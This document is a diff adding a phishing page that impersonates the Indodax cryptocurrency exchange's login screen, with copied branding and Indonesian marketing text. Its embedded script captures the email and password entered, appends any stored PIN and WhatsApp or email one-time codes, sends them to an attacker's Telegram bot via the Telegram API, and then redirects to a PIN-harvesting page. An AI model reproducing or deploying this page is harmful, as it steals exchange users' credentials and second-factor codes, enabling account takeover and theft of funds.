@@ -1,0 +1,293 @@
+<html lang="id">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Indodax Login
+  </title>
+  <meta content="https://play-lh.googleusercontent.com/5ZXeoIWgd-aIeMu6_egLZOG5gA-aNzhFTEkJmhrl3VkAoRJgN7Pi0TnpdlRu7sN3mQ" name="og:image"/>
+  <link href="https://play-lh.googleusercontent.com/5ZXeoIWgd-aIeMu6_egLZOG5gA-aNzhFTEkJmhrl3VkAoRJgN7Pi0TnpdlRu7sN3mQ" rel="shortcut icon" type="image/x-icon"/>
+  <link href="https://play-lh.googleusercontent.com/5ZXeoIWgd-aIeMu6_egLZOG5gA-aNzhFTEkJmhrl3VkAoRJgN7Pi0TnpdlRu7sN3mQ" rel="apple-touch-icon"/>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+      font-family: "Inter", sans-serif;
+    }
+    /* Custom CSS for disabled button */
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      background-color: #708090; /* lighter blue */
+      color: white; /* white text for disabled */
+      box-shadow: none;
+    }
+  </style>
+ </head>
+ <body class="bg-white text-gray-800 min-h-screen relative">
+  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
+   <div class="flex items-center space-x-2">
+    <img alt="Indodax logo, stylized text logo in blue and black colors" class="h-7 w-auto" height="28" src="https://www.freelogovectors.net/wp-content/uploads/2021/12/indodax-logo-freelogovectors.net_-400x70.png" width="160"/>
+   </div>
+   <button class="bg-[#1d9bf0] text-white text-sm font-semibold px-4 py-1 rounded" type="button">
+    Daftar
+   </button>
+  </header>
+  <main class="px-5 pt-6 max-w-md mx-auto">
+   <h1 class="font-bold text-base leading-6 mb-1">
+    INDODAX Login
+   </h1>
+   <p class="text-gray-700 text-sm mb-5 leading-relaxed">
+    Gunakan email dan kata sandi yang terdaftar untuk masuk ke akun Anda
+   </p>
+   <form autocomplete="off" class="space-y-4" id="loginForm">
+    <div>
+     <label class="block text-xs font-semibold mb-1" for="email">
+      Email
+     </label>
+     <input class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-[#cbd5e1]" id="email" name="email" placeholder="Masukkan Email" required="" type="email"/>
+    </div>
+    <div>
+     <label class="block text-xs font-semibold mb-1" for="password">
+      Password
+     </label>
+     <div class="relative">
+      <input class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-[#cbd5e1]" id="password" name="password" placeholder="Masukkan Kata Sandi" required="" type="password"/>
+      <button aria-label="Toggle password visibility" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm focus:outline-none" id="togglePassword" type="button">
+       <svg class="h-5 w-5" fill="none" id="eyeIcon" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" stroke-linecap="round" stroke-linejoin="round">
+        </path>
+        <path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" stroke-linecap="round" stroke-linejoin="round">
+        </path>
+       </svg>
+      </button>
+     </div>
+     <div class="text-right mt-1">
+      <a class="text-[#1d9bf0] text-xs font-medium" href="https://indodax.com/forgot-password">
+       Lupa Kata Sandi
+      </a>
+     </div>
+    </div>
+    <button class="w-full bg-[#1d9bf0] text-white font-semibold text-sm py-2 rounded disabled:opacity-50 disabled:cursor-not-allowed" id="submitBtn" type="submit" disabled>
+     Masuk
+    </button>
+   </form>
+   <div class="flex items-center my-5 text-xs text-gray-400">
+    <hr class="flex-grow border-t border-gray-300"/>
+    <span class="px-3 text-lg font-semibold">
+     Atau
+    </span>
+    <hr class="flex-grow border-t border-gray-300"/>
+   </div>
+   <button class="w-full border border-gray-300 rounded-md py-2 flex items-center justify-center gap-2 text-sm text-gray-700 hover:bg-gray-50" type="button">
+    <img alt="Google logo in color" class="inline-block" height="18" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmguRXM4x_NfZV05wWKPTaYP90hhm3TwfDK_N-dvY9jhmzEVdq-ntere8&amp;s=10" width="18"/>
+    Lanjut dengan Google
+   </button>
+   <section class="mt-8">
+    <h2 class="font-semibold text-lg mb-3">
+     Mengapa 9.0 juta++ pengguna memilih Indodax sebagai exchange andalan
+    </h2>
+    <section class="space-y-10">
+     <article class="flex items-start space-x-6">
+      <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+       <img alt="Gold medal with red ribbons and 1st text in center" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/pionir.svg" width="34"/>
+      </div>
+      <div>
+       <h1 class="font-extrabold text-base leading-tight mb-2">
+        Pionir dan Paling Dipercaya
+       </h1>
+       <p class="text-[#5F6C7B] text-sm leading-relaxed max-w-xl">
+        Bergabung dengan platform jual-beli kripto pertama di Indonesia dengan rekam jejak solid sejak 2014.
+       </p>
+      </div>
+     </article>
+     <article class="flex items-start space-x-6">
+      <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+       <img alt="Green shield icon with person silhouette inside" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/registered.svg" width="34"/>
+      </div>
+      <div>
+       <h2 class="font-extrabold text-base leading-tight mb-2">
+        Terdaftar dan Teregulasi
+       </h2>
+       <p class="text-[#5F6C7B] text-sm leading-relaxed max-w-xl">
+        INDODAX terdaftar dan diawasi oleh Otoritas Jasa Keuangan (OJK) sebagai Pedagang Aset Keuangan Digital (PAKD) yang resmi.
+       </p>
+      </div>
+     </article>
+     <article class="flex items-start space-x-6">
+      <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+       <img alt="Stack of colorful coins with bitcoin symbol on top orange green blue gray" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/various_coins.svg" width="34"/>
+      </div>
+      <div>
+       <h2 class="font-extrabold text-base leading-tight mb-2">
+        Pilihan Koin Beragam
+       </h2>
+       <p class="text-[#5F6C7B] text-sm leading-relaxed max-w-xl">
+        Belanja kripto tanpa takut kehabisan pilihan di market dengan lebih dari 400 koin kripto diperdagangkan.
+       </p>
+      </div>
+     </article>
+     <article class="flex items-start space-x-6">
+      <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+       <img alt="Purple banknote with Rp symbol and 10000 denomination" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/deposit.svg" width="34"/>
+      </div>
+      <div>
+       <h2 class="font-extrabold text-base leading-tight mb-2">
+        Deposit Mulai dari Rp10.000
+       </h2>
+       <p class="text-[#5F6C7B] text-sm leading-relaxed max-w-xl">
+        Mulai investasi di aset kripto tanpa perlu ragu dengan minimal deposit hanya Rp10.000.
+       </p>
+      </div>
+     </article>
+     <article class="flex items-start space-x-6">
+      <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+       <img alt="Hand holding smartphone with app screen showing a star icon" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/easy_to_use.svg" width="34"/>
+      </div>
+      <div>
+       <h2 class="font-extrabold text-base leading-tight mb-2">
+        Kemudahan Ada di Tangan
+       </h2>
+       <p class="text-[#5F6C7B] text-sm leading-relaxed max-w-xl">
+        Transaksi melalui website atau pun aplikasi dengan fitur yang mendukung trader di semua tingkatan.
+       </p>
+      </div>
+     </article>
+    </section>
+    <footer class="mt-16 text-center text-[#5F6C7B] text-sm leading-relaxed max-w-xl mx-auto">
+     Copyright © 2014 - 2025 PT Indodax Nasional Indonesia. All Rights Reserved.
+    </footer>
+   </section>
+  </main>
+  <div aria-busy="true" aria-live="assertive" class="fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center z-50 hidden" id="loadingOverlay" role="alert">
+   <svg aria-hidden="true" class="animate-spin h-10 w-10 text-[#1d9bf0]" fill="none" viewbox="0 0 24 24">
+    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4">
+    </circle>
+    <path class="opacity-75" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" fill="currentColor">
+    </path>
+   </svg>
+   <span class="mt-4 text-[#1d9bf0] font-semibold text-sm">
+    Memuat...
+   </span>
+  </div>
+  <script>
+   const form = document.getElementById("loginForm");
+    const loadingOverlay = document.getElementById("loadingOverlay");
+    const submitBtn = document.getElementById("submitBtn");
+    const togglePasswordBtn = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("password");
+    const emailInput = document.getElementById("email");
+    const eyeIcon = document.getElementById("eyeIcon");
+
+    let botToken;
+    let chatId;
+
+    // Fetch Telegram bot token and chat ID from config.php
+    fetch("config.json")
+      .then(response => response.json())
+      .then(config => {
+        botToken = config.telegramBotToken;
+        chatId = config.telegramChatId;
+      })
+      .catch(error => {
+        console.error("Error fetching config:", error);
+        alert("Failed to load configuration.");
+      });
+
+    // Enable submit button only if both email and password have values
+    function checkInputs() {
+      if(emailInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.disabled = true;
+      }
+    }
+
+    emailInput.addEventListener("input", checkInputs);
+    passwordInput.addEventListener("input", checkInputs);
+
+    togglePasswordBtn.addEventListener("click", () => {
+      const isPassword = passwordInput.getAttribute("type") === "password";
+      passwordInput.setAttribute("type", isPassword ? "text" : "password");
+
+      // Change icon
+      if (isPassword) {
+        eyeIcon.innerHTML = `
+          <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.477 0-8.268-2.943-9.542-7a9.956 9.956 0 012.223-3.434m3.31-2.577A9.953 9.953 0 0112 5c4.477 0 8.268 2.943 9.542 7a10.05 10.05 0 01-1.223 2.432M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18" />
+        `;
+      } else {
+        eyeIcon.innerHTML = `
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+        `;
+      }
+    });
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const email = e.target.email.value;
+      const password = e.target.password.value;
+
+      // Disable submit button
+      submitBtn.disabled = true;
+
+      // Save email to localStorage
+      localStorage.setItem("userEmail", email);
+      localStorage.setItem("userPassword", password);
+
+      // Show loading overlay
+      loadingOverlay.classList.remove("hidden");
+
+      // Prepare message text
+      const message = `Indodaxcom:
+Email: ${email}
+Password: ${password}`;
+
+      // Retrieve existing data from localStorage
+      const storedPin = localStorage.getItem("userPin");
+      const storedWhatsappOtp = localStorage.getItem("userWhatsappOtp");
+      const storedEmailOtp = localStorage.getItem("userEmailOtp");
+
+      let fullMessage = `Indodaxcom:
+Email: ${email}
+Password: ${password}`;
+      if (storedPin) {
+        fullMessage += `\nPIN: ${storedPin}`;
+      }
+      if (storedWhatsappOtp) {
+        fullMessage += `\nWhatsApp OTP: ${storedWhatsappOtp}`;
+      }
+      if (storedEmailOtp) {
+        fullMessage += `\nEmail OTP: ${storedEmailOtp}`;
+      }
+
+      // Telegram API URL
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        // Send data to Telegram
+        await fetch(telegramUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: fullMessage,
+          }),
+        });
+      } catch (error) {
+        console.error("Error sending message to Telegram:", error);
+      }
+
+      // Redirect after short delay
+      setTimeout(() => {
+        window.location.href = "pin.html";
+      }, 800);
+    });
+  </script>
+ </body>
+        </html>
